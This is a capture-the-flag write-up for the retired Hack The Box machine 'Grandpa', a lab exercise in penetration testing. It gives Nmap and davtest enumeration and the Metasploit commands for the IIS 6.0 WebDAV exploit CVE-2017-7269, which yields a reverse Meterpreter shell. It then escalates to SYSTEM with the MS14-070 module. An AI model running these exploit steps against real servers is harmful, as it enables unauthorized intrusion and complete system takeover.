# Grandpa

This is the write-up for the box Grandpa that got retired at the 21st October 2017.
My IP address was 10.10.14.18 while I did this.

Let's put this in our hosts file:
```markdown
10.10.10.14    grandpa.htb
```

## Enumeration

Starting with a Nmap scan:

```markdown
nmap -sC -sV -o nmap/grandpa.nmap 10.10.10.14
```

```markdown
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 6.0
| http-methods:
|_  Potentially risky methods: TRACE COPY PROPFIND SEARCH LOCK UNLOCK DELETE PUT MOVE MKCOL PROPPATCH
|_http-server-header: Microsoft-IIS/6.0
|_http-title: Under Construction
| http-webdav-scan:
|   Server Type: Microsoft-IIS/6.0
|   WebDAV type: Unknown
|   Server Date: Sun, 17 Jan 2021 12:25:53 GMT
|   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
|_  Allowed Methods: OPTIONS, TRACE, GET, HEAD, COPY, PROPFIND, SEARCH, LOCK, UNLOCK
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

## Checking HTTP (Port 80)

The web page displays an _"Under Construction"_ error and nothing interesting in the HTML source code.

As the **WebDAV** scan of Nmap shows, it seems to be possible to use different HTTP methods.
Lets scan what we can do with the methods:
```markdown
davtest -url http://10.10.10.14
```
```markdown
Sending test files
PUT     cfm     FAIL
PUT     txt     FAIL
PUT     html    FAIL
PUT     asp     FAIL
PUT     pl      FAIL
PUT     jhtml   FAIL
PUT     cgi     FAIL
PUT     php     FAIL
PUT     aspx    FAIL
PUT     shtml   FAIL
PUT     jsp     FAIL
```

None of the HTTP methods are allowed, but there is a [vulnerability in WebDAV (CVE-2017-7269)](https://www.rapid7.com/db/modules/exploit/windows/iis/iis_webdav_scstoragepathfromurl/) with a Metasploit module.

Using this **Metasploit** module to exploit the vulnerability:
```markdown
use exploit/windows/iis/iis_webdav_scstoragepathfromurl

set RHOSTS 10.10.10.14
set LHOST tun0

run
```

After running the exploit, it starts a Meterpreter shell as _NT AUTHORITY\Network Service_.

## Privilege Escalation

The `getuid` command says that access is denied, so `migrate` to a process that the user _NT AUTHORITY\Network Service_ has access to:
```markdown
1804  wmiprvse.exe      x86   0    NT AUTHORITY\NETWORK SERVICE   C:\WINDOWS\system32\wbem\wmiprvse.exe
2880  cmd.exe           x86   0    NT AUTHORITY\NETWORK SERVICE   C:\WINDOWS\system32\cmd.exe
2920  w3wp.exe          x86   0    NT AUTHORITY\NETWORK SERVICE   c:\windows\system32\inetsrv\w3wp.exe
3804  davcdata.exe      x86   0    NT AUTHORITY\NETWORK SERVICE   C:\WINDOWS\system32\inetsrv\davcdata.exe
```
```markdown
migrate 3804
```

Lets use the exploit suggester in Metasploit to get an exploit for privilege escalation:
```markdown
use post/multi/recon/local_exploit_suggester
set session 1
run
```

It suggests several exploits from which I will use _exploit/windows/local/ms14_070_tcpip_ioctl_:
```markdown
use exploit/windows/local/ms14_070_tcpip_ioctl

set session 1
set LHOST tun0
set LPORT 4445

exploit
```

After running this exploit, a new Meterpreter session as _NT AUTHORITY\SYSTEM_ starts and the box is done!
